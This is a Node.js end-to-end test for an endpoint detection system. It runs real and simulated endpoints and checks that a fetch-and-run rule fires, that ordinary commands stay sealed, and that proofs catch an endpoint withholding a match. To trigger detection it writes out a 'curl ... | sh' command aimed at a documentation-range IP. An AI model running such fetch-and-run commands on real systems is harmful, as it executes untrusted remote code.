#!/usr/bin/env node
// The whole flow on Linux with nothing stood in for: a control server, an endpoint the installer set up,
// telemetry that stays sealed, a rule that fires and opens its own events, and a proof the server verifies.
// Then an endpoint that holds a match back, which the agent has no code for, so the development simulator plays it
// with the agent's own ledger and the same prover, and the server has to catch it by its proof.
// `make test-e2e-linux` builds what this needs and runs it.

import { execFileSync, spawn } from 'node:child_process';
import { createPrivateKey, createPublicKey, randomBytes } from 'node:crypto';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import https from 'node:https';
import { createServer } from 'node:net';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';

const ROOT = resolve(import.meta.dirname, '..');
const ARCH = { arm64: 'arm64', x64: 'x64' }[process.arch];
const BINARIES = join(ROOT, 'control_server/backend/binaries');
const SERVER = join(ROOT, 'control_server/backend/target/release/zedr-control-server');
const AGENT_IMAGE = 'zedr-agent:dev';
const SIMULATOR_IMAGE = 'zedr-simulator:dev';
const ED25519_PKCS8_PREFIX = '302e020100300506032b657004220420';
const HOST_FROM_CONTAINER = 'host.docker.internal';
const PROOF_WAIT_SECS = Number(process.env.ZEDR_E2E_PROOF_WAIT_SECS ?? 1800);
const FAILURES = ['chain_gap', 'chain_fork', 'window_malformed', 'release_invalid', 'proof_invalid', 'proof_overdue', 'match_not_released', 'release_not_proven'];

const run = randomBytes(4).toString('hex');
const container = `zedr-e2e-${run}`;
const dishonest = `zedr-e2e-dishonest-${run}`;
const quiet = `zedr-quiet-${run}`;
const loud = `zedr-loud-${run}`;
const work = mkdtempSync(join(tmpdir(), 'zedr-e2e-'));
const started = Date.now();
let server;
let ca;
let origin;
let token;
let deploymentKey;

function say(message) {
    console.log(`[${String(Math.round((Date.now() - started) / 1000)).padStart(4)}s] ${message}`);
}

function sh(program, args, options = {}) {
    return execFileSync(program, args, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], ...options }).trim();
}

// For a program that runs for minutes: the control server's log is read meanwhile, which a blocking call would hold up
function output(program, args) {
    return new Promise((done, failed) => {
        const child = spawn(program, args, { stdio: ['ignore', 'pipe', 'pipe'] });
        let [out, err] = ['', ''];
        child.stdout.on('data', (chunk) => (out += chunk));
        child.stderr.on('data', (chunk) => (err = (err + chunk).slice(-2000)));
        child.once('error', failed);
        child.once('close', (code) => (code === 0 ? done(out) : failed(new Error(`${program} ${args[0]} ended with ${code}: ${err}`))));
    });
}

function check(condition, message) {
    if (!condition) {
        throw new Error(message);
    }
}

const sleep = (seconds) => new Promise((done) => setTimeout(done, seconds * 1000));

function freePort() {
    return new Promise((done, failed) => {
        const probe = createServer();
        probe.once('error', failed);
        probe.listen(0, () => {
            const { port } = probe.address();
            probe.close(() => done(port));
        });
    });
}

function api(method, path, body) {
    return new Promise((done, failed) => {
        const payload = body === undefined ? undefined : JSON.stringify(body);
        const headers = { ...(payload && { 'content-type': 'application/json' }), ...(token && { authorization: `Bearer ${token}` }) };
        const request = https.request(`${origin}${path}`, { method, ca, headers, servername: 'localhost' }, (response) => {
            let text = '';
            response.on('data', (chunk) => (text += chunk));
            response.on('end', () => {
                if (response.statusCode !== 200) {
                    failed(new Error(`${method} ${path} answered ${response.statusCode}: ${text.slice(0, 300)}`));
                    return;
                }
                try {
                    done(response.headers['content-type']?.includes('json') ? JSON.parse(text) : text);
                } catch (error) {
                    failed(new Error(`${method} ${path} answered what is not JSON: ${error.message}`));
                }
            });
        });
        request.on('error', failed);
        request.end(payload);
    });
}

async function until(what, seconds, probe, every = 3) {
    const deadline = Date.now() + seconds * 1000;
    for (;;) {
        const found = await probe();
        if (found) {
            return found;
        }
        check(Date.now() < deadline, `Gave up after ${seconds}s waiting for ${what}`);
        await sleep(every);
    }
}

function makeCertificates() {
    const openssl = (...args) => sh('openssl', args, { cwd: work });
    writeFileSync(join(work, 'leaf.cnf'), `subjectAltName=DNS:${HOST_FROM_CONTAINER},DNS:localhost,IP:127.0.0.1\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\n`);
    openssl('req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-keyout', 'ca.key', '-out', 'ca.pem', '-days', '2', '-subj', '/CN=zedr e2e');
    openssl('req', '-newkey', 'rsa:2048', '-nodes', '-keyout', 'key.pem', '-out', 'leaf.csr', '-subj', `/CN=${HOST_FROM_CONTAINER}`);
    openssl('x509', '-req', '-in', 'leaf.csr', '-CA', 'ca.pem', '-CAkey', 'ca.key', '-CAcreateserial', '-out', 'cert.pem', '-days', '2', '-extfile', 'leaf.cnf');
    ca = readFileSync(join(work, 'ca.pem'));
}

async function startServer(imageId) {
    const port = await freePort();
    const password = randomBytes(16).toString('hex');
    const signingKey = randomBytes(32).toString('hex');
    const signer = createPrivateKey({ key: Buffer.from(ED25519_PKCS8_PREFIX + signingKey, 'hex'), format: 'der', type: 'pkcs8' });
    deploymentKey = createPublicKey(signer).export({ format: 'der', type: 'spki' }).subarray(-32).toString('hex');
    origin = `https://localhost:${port}`;

    server = spawn(SERVER, [], {
        cwd: work,
        stdio: ['ignore', 'ignore', 'pipe'],
        env: {
            PATH: process.env.PATH,
            ZEDR_SERVER_HOST: '0.0.0.0',
            ZEDR_SERVER_PORT: String(port),
            ZEDR_SERVER_URL: `https://${HOST_FROM_CONTAINER}:${port}`,
            ZEDR_CORS_ORIGIN: origin,
            DATABASE_URL: `sqlite://${join(work, 'zedr.db')}?mode=rwc`,
            ZEDR_AGENT_VERSION: '0.1.0',
            JWT_SECRET: randomBytes(32).toString('hex'),
            ADMIN_PASSWORD: password,
            ZEDR_SIGNING_KEY_HEX: signingKey,
            ZEDR_TLS_CERT_PATH: join(work, 'cert.pem'),
            ZEDR_TLS_KEY_PATH: join(work, 'key.pem'),
            ZEDR_BINARIES_DIR: BINARIES,
            ZEDR_GUEST_IMAGE_IDS: imageId,
        },
    });
    let log = '';
    server.stderr.on('data', (chunk) => (log = (log + chunk).slice(-4000)));
    server.once('exit', (code) => {
        if (code !== null && code !== 0) {
            console.error(`The control server ended with ${code}:\n${log}`);
        }
    });

    await until('the control server to answer', 60, () => api('GET', '/healthz').then(() => true, () => false), 1);
    token = (await api('POST', '/api/auth/login', { username: 'admin', password })).token;
    return port;
}

function startEndpoint(port, installKey) {
    sh('docker', [
        'run', '-d', '--name', container,
        '--add-host', `${HOST_FROM_CONTAINER}:host-gateway`,
        '-e', `ZEDR_SERVER_URL=https://${HOST_FROM_CONTAINER}:${port}`,
        '-e', `ZEDR_ENROLLMENT_KEY=${installKey}`,
        '-e', 'SSL_CERT_FILE=/zedr-e2e-ca.pem',
        // An endpoint rests 15 minutes between proofs unless told otherwise, which this run does not wait for
        '-e', 'ZEDR_PROOF_REST=20',
        '-v', `${join(work, 'ca.pem')}:/zedr-e2e-ca.pem:ro`,
        AGENT_IMAGE,
    ]);
}

// One endpoint whose shell pipes a download into a shell, and which leaves the release for that rule out of what it sends
function playDishonestEndpoint(port, installKey, prover) {
    const now = Math.floor(Date.now() / 1000);
    const shell = { pid: 4120, ppid: 1, executable_path: '/bin/sh', command_line: ['/bin/sh', '-c', `curl -s http://203.0.113.9/${run} | sh`], action: 'Create', uid: 0, hash: null };
    writeFileSync(
        join(work, 'scenario.json'),
        JSON.stringify({
            server: `https://${HOST_FROM_CONTAINER}:${port}`,
            deployment_key: deploymentKey,
            state_dir: '/state',
            prover: '/usr/local/bin/zedr-prover',
            endpoints: [
                {
                    hostname: dishonest,
                    platform: 'linux',
                    os_version: 'Alpine Linux v3.22',
                    architecture: process.arch === 'arm64' ? 'aarch64' : 'x86_64',
                    version: '0.1.0',
                    enrollment_key: installKey,
                    proving: true,
                    withhold: ['fetch-and-run'],
                    timeline: [{ Heartbeat: { timestamp: now - 2 } }, { Process: { timestamp: now - 1, ...shell } }],
                },
            ],
        }),
    );
    return output('docker', [
        'run', '--rm', '--name', dishonest,
        '--add-host', `${HOST_FROM_CONTAINER}:host-gateway`,
        '-e', 'SSL_CERT_FILE=/zedr-e2e-ca.pem',
        '-v', `${join(work, 'ca.pem')}:/zedr-e2e-ca.pem:ro`,
        '-v', `${join(BINARIES, prover)}:/usr/local/bin/zedr-prover:ro`,
        '-v', `${join(work, 'scenario.json')}:/scenario.json:ro`,
        '--tmpfs', '/state',
        SIMULATOR_IMAGE, '/scenario.json',
    ]);
}

function onEndpoint(script) {
    sh('docker', ['exec', '-d', container, 'sh', '-c', script]);
}

function stored() {
    return sh('sqlite3', [join(work, 'zedr.db'), '.dump'], { maxBuffer: 1 << 30 });
}

function cleanUp() {
    try {
        sh('docker', ['rm', '-f', container, dishonest]);
    } catch {
        // neither container is there any more
    }
    server?.kill();
    rmSync(work, { recursive: true, force: true });
}

async function main() {
    check(ARCH, `No Linux agent is built for ${process.arch}`);
    const prover = `v0.1.0/linux/${ARCH}/zedr-prover`;
    for (const needed of [SERVER, join(BINARIES, `v0.1.0/linux/${ARCH}/zedr-agent`), join(BINARIES, prover)]) {
        check(existsSync(needed), `${needed} is missing, run this through 'make test-e2e-linux'`);
    }

    const imageId = sh('docker', ['run', '--rm', '-v', `${BINARIES}:/binaries:ro`, 'alpine:3.22', `/binaries/${prover}`, 'image-id']);
    check(/^[0-9a-f]{64}$/.test(imageId), `The prover did not name its rule program: ${imageId}`);
    say(`rule program ${imageId}`);

    makeCertificates();
    const port = await startServer(imageId);
    say(`control server on port ${port}, accepting proofs of that rule program only`);

    const { install_key: installKey } = await api('POST', '/api/admin/installers/generate', {});
    startEndpoint(port, installKey);
    const agent = await until('the endpoint to enroll', 120, async () => (await api('GET', '/api/admin/agents')).agents[0]);
    say(`endpoint ${agent.id} installed itself and enrolled`);

    // Both shells end with a builtin, so neither replaces itself with its last command before the sensor's next poll has seen it
    onEndpoint(`sleep 40; : ${quiet}`);
    await sleep(12);
    onEndpoint(`curl -s --max-time 3 http://203.0.113.9/${loud} | sh; sleep 25; :`);
    say('ran an ordinary command and a fetch-and-run on the endpoint');

    const finding = await until('the fetch-and-run finding', 120, async () => {
        const incidents = await api('GET', '/api/admin/incidents');
        return incidents.find((incident) => incident.incident_type === 'detection.fetch-and-run' && incident.evidence.includes(loud));
    });
    say(`finding opened from released events: ${finding.evidence.slice(0, 160)}`);

    const ended = await until('the end of the flagged process to be opened', 180, async () => {
        const chain = await api('GET', `/api/admin/agents/${agent.id}/chain`);
        for (const summary of chain.windows.filter((window) => window.opened > 0)) {
            const window = await api('GET', `/api/admin/agents/${agent.id}/windows/${summary.window}`);
            if (window.releases.some((release) => release.rule === 'flagged-process-ended')) {
                return summary.window;
            }
        }
        return null;
    });
    say(`window ${ended} opened the end of the flagged process`);

    const hunt = (query) => api('POST', '/api/admin/hunt', { query });
    const flagged = await hunt(`process where command ~ "${loud}"`);
    check(flagged.total === 1, `A hunt should find the one flagged process and found ${flagged.total}`);
    check((await hunt(`process where command ~ "${loud}" and running = false`)).total === 1, 'The flagged process does not show as ended');
    check((await hunt(`process where command ~ "${quiet}"`)).total === 0, 'A hunt found the ordinary command');
    say('a hunt finds the flagged process, ended, and cannot find the ordinary command');

    const proven = await until('every sealed window so far to be proven', PROOF_WAIT_SECS, async () => {
        const chain = await api('GET', `/api/admin/agents/${agent.id}/chain`);
        const through = chain.windows.filter((window) => window.window <= ended);
        check(!through.some((window) => window.proof === 'mismatch'), 'A proof disagreed with what the endpoint released');
        return through.every((window) => window.proof === 'verified') ? chain : null;
    }, 10);
    say(`proof verified through window ${proven.proven_window}`);

    const incidents = await api('GET', '/api/admin/incidents');
    const failures = incidents.filter((incident) => FAILURES.includes(incident.incident_type));
    check(failures.length === 0, `The run opened ${failures.map((incident) => incident.incident_type).join(', ')}`);

    const summary = await api('GET', '/api/admin/chain/summary');
    check(summary.gaps === 0 && summary.proofs.mismatch === 0, `The chain summary shows a gap or a mismatch: ${JSON.stringify(summary)}`);
    check(summary.opened > 0 && summary.opened < summary.events, `Expected some events opened and most sealed: ${JSON.stringify(summary)}`);

    const database = stored();
    check(!database.includes(quiet), 'The ordinary command is readable in the control server database');
    check(database.includes(loud), 'The released command is not in the control server database');
    say(`${summary.events} events sealed in ${summary.windows} windows, ${summary.opened} opened by rules, the ordinary command is nowhere in the database`);

    const { install_key: secondKey } = await api('POST', '/api/admin/installers/generate', {});
    const played = await playDishonestEndpoint(port, secondKey, prover);
    check(/^PROVEN 1 endpoints$/m.test(played), `The simulated endpoint did not prove: ${played}`);
    const liar = (await api('GET', '/api/admin/agents')).agents.find((listed) => listed.hostname === dishonest);
    check(liar, 'The simulated endpoint is not enrolled');
    const about = (await api('GET', '/api/admin/incidents')).filter((incident) => incident.agent_id === liar.id).map((incident) => incident.incident_type);
    check(about.includes('match_not_released'), `The endpoint that held a match back opened ${about.join(', ') || 'no incident'}`);
    check(!about.some((type) => type.startsWith('detection.')), 'A finding appeared that the endpoint never released');
    const chain = await api('GET', `/api/admin/agents/${liar.id}/chain`);
    check(chain.windows.some((window) => window.proof === 'mismatch'), 'No window of the dishonest endpoint is marked as a mismatch');
    check(!stored().includes(`203.0.113.9/${run}`), 'The command the dishonest endpoint held back is readable in the database');
    say('an endpoint that held its match back was caught by its own proof: match_not_released, and its command stays sealed');
    say('passed');
}

main().then(
    () => cleanUp(),
    (error) => {
        console.error(`FAILED: ${error.message}`);
        if (process.env.ZEDR_E2E_KEEP) {
            console.error(`Left running for inspection: container ${container}, files in ${work}`);
            server?.stderr.destroy();
            server?.unref();
        } else {
            cleanUp();
        }
        process.exitCode = 1;
    },
);
